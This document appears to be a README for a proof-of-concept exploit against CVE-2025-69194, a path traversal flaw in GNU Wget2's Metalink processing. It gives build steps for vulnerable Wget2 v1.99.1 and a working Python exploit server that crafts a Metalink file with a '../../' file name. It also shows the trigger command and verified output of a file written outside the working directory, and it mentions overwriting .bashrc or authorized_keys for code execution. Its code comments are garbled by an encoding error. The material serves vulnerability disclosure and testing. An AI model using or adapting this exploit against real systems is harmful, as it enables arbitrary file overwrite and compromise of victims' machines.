# CVE-2025-69194: GNU Wget2 Path Traversal Vulnerability

## ğŸ“ Description

PoC for **CVE-2025-69194**, a critical Path Traversal vulnerability in **GNU Wget2 <= 2.2.0** (verified on v1.99.1). This vulnerability allows attackers to achieve arbitrary file write or overwrite on the victim's filesystem by providing a malicious Metalink file with manipulated `file name` attributes.

When Wget2 processes a Metalink file using the `--force-metalink` option, it fails to properly sanitize directory traversal sequences (e.g., `../../`). This can lead to **Remote Code Execution (RCE)** if an attacker overwrites sensitive system files (like `.bashrc`, `.ssh/authorized_keys`) or system binaries.

---

## ğŸ› ï¸ Testing Environment (Ubuntu 22.04)

To accurately reproduce the vulnerability, we compile **Wget2 v1.99.1** from source to ensure the vulnerable Metalink module is active and unpatched.

### 1. Install Dependencies

```bash
sudo apt update && sudo apt install -y build-essential libgnutls28-dev libxml2-dev \
                     libzstd-dev liblzma-dev libpcre2-dev libidn2-dev libpsl-dev \
                     libbrotli-dev autoconf automake libtool gettext pkg-config python3

```

### 2. Compile and Install Wget2 v1.99.1

```bash
wget https://ftp.gnu.org/gnu/wget/wget2-1.99.1.tar.gz
tar -xvf wget2-1.99.1.tar.gz && cd wget2-1.99.1
./configure --with-libxml2
make -j$(nproc)
sudo make install && sudo ldconfig

# Verify installation (+metalink support is required)
wget2 --version | grep -E "1.99.1|metalink"

```

---

## ğŸš€ Proof of Concept (PoC)

### 1. Attacker Side (Python Exploit Server)

The attacker hosts a malicious `.metalink` file and the corresponding payload. Save the following as `poc.py`:

```python
import os
import hashlib
import http.server
import socketserver
import threading
import time

# --- é…ç½®åŒº ---
TARGET_FILE_NAME = "../../pwned_test.txt"  # æƒ³è¦ç©¿è¶Šåˆ°çš„ç›®æ ‡è·¯å¾„
PAYLOAD_CONTENT = "pwned by CVE-2025-69194\n"
PORT = 8000
METALINK_FILE = "exploit.metalink"
PAYLOAD_FILE = "evil.dat"


def create_files():
    # 1. åˆ›å»ºè½½è·æ–‡ä»¶
    with open(PAYLOAD_FILE, "w") as f:
        f.write(PAYLOAD_CONTENT)

    # è®¡ç®— SHA256
    sha256_hash = hashlib.sha256(PAYLOAD_CONTENT.encode()).hexdigest()
    file_size = len(PAYLOAD_CONTENT)

    # 2. æ„é€ æ¶æ„çš„ Metalink ç»“æ„
    metalink_content = f'''<?xml version="1.0" encoding="UTF-8"?>
<metalink xmlns="http://www.metalinker.org/">
  <files>
    <file name="{TARGET_FILE_NAME}">
      <size>{file_size}</size>
      <verification>
        <hash type="sha256">{sha256_hash}</hash>
      </verification>
      <resources>
        <url type="http">http://127.0.0.1:{PORT}/{PAYLOAD_FILE}</url>
      </resources>
    </file>
  </files>
</metalink>
'''
    with open(METALINK_FILE, "w") as f:
        f.write(metalink_content)
    print(f"[+] æ¶æ„æ–‡ä»¶ {METALINK_FILE} å·²ç”Ÿæˆã€‚")


def start_server():
    handler = http.server.SimpleHTTPRequestHandler
    with socketserver.TCPServer(("", PORT), handler) as httpd:
        print(f"[*] æ¶æ„æœåŠ¡å™¨å·²åœ¨ç«¯å£ {PORT} å¯åŠ¨...")
        httpd.serve_forever()


if __name__ == "__main__":
    # æ¸…ç†æ—§æ–‡ä»¶
    if os.path.exists(TARGET_FILE_NAME):
        os.remove(TARGET_FILE_NAME)

    create_files()

    # å¯åŠ¨åå°æœåŠ¡å™¨
    server_thread = threading.Thread(target=start_server, daemon=True)
    server_thread.start()

    time.sleep(1)  # ç­‰å¾…æœåŠ¡å™¨å°±ç»ª

    print("\n[!] ç°åœ¨è¯·åœ¨å¦ä¸€ä¸ªç»ˆç«¯æ‰§è¡Œä»¥ä¸‹å‘½ä»¤è¿›è¡Œå¤ç°ï¼š")
    print(f"wget2 --force-metalink -i {METALINK_FILE}")
    print(f"\n[!] æ‰§è¡Œåï¼Œæ£€æŸ¥ç›®æ ‡æ–‡ä»¶æ˜¯å¦å­˜åœ¨ï¼š")
    print(f"ls {TARGET_FILE_NAME} && cat {TARGET_FILE_NAME}")

    # ä¿æŒä¸»çº¿ç¨‹è¿è¡Œ
    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        print("\n[+] æ¼”ç¤ºç»“æŸï¼Œæ­£åœ¨æ¸…ç†...")


```

### 2. Victim Side (Triggering the Exploit)

Run the following command in a sub-directory (e.g., `~/Downloads/CVE-2025-69194/`) to observe the directory escape:

```bash
# Pre-check: Verify the file does not exist in the parent's parent directory
ls ../../pwned_test.txt

# Execute the exploit
wget2 --force-metalink -i exploit.metalink

```

---

## ğŸ“Š Technical Analysis

The vulnerability exists in the Metalink parsing logic where the `name` attribute is trusted without normalization.

| Phase | Description |
| --- | --- |
| **Input** | Wget2 reads `<file name="../../pwned_test.txt">`. |
| **Bypass** | No check is performed to see if the path contains `../` or attempts to leave the CWD. |
| **Write** | Wget2 opens the resolved path `CWD + ../../pwned_test.txt` and writes the verified payload. |

---

## ğŸ“ Sample Output (Verified)

As demonstrated in the successful reproduction, the file `pwned_test.txt` was created two levels above the execution folder:

```text
lele@u22:~/Downloads/CVE-2025-69194$ ls ../../pwned_test.txt
ls: cannot access '../../pwned_test.txt': No such file or directory

lele@u22:~/Downloads/CVE-2025-69194$ wget2 --force-metalink -i exploit.metalink
downloading part 1/1 (0-23) ../../pwned_test.txt from 127.0.0.1
HTTP response 200 OK [http://127.0.0.1:8000/evil.dat]
part 1 downloaded
../../pwned_test.txt checking...
Checksum OK for '../../pwned_test.txt'

lele@u22:~/Downloads/CVE-2025-69194$ ls ../../pwned_test.txt && cat ../../pwned_test.txt
../../pwned_test.txt
pwned by CVE-2025-69194

```

---

![version](./version.png)
![poc](./poc.png)
![test](./test.png)
## âš ï¸ Disclaimer

This tool is provided for **educational and authorized security testing purposes only**. The author is not responsible for any damage caused by the misuse of this information. Unauthorized access to computer systems is strictly prohibited.
